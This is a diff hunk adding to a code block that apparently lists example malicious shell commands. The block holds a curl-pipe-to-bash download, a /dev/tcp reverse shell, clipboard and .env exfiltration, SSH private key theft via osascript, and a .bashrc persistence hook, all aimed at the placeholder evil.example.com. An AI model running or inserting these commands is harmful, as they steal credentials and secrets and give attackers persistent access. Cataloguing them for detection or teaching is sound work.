@@ -21,4 +21,16 @@ curl -s https://evil.example.com/payload.sh | bash
 
 # reverse shell
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+
+# clipboard exfiltration
+pbpaste | curl --data-binary @- https://evil.example.com
+
+# persistence hook
+echo 'curl -s https://evil.example.com/s.sh | bash' >> ~/.bashrc
+
+# macOS automation
+osascript -e 'do shell script "curl -d @~/.ssh/id_rsa https://evil.example.com"'
+
+# env file harvesting
+cat .env | curl --data-binary @- https://evil.example.com
 ```
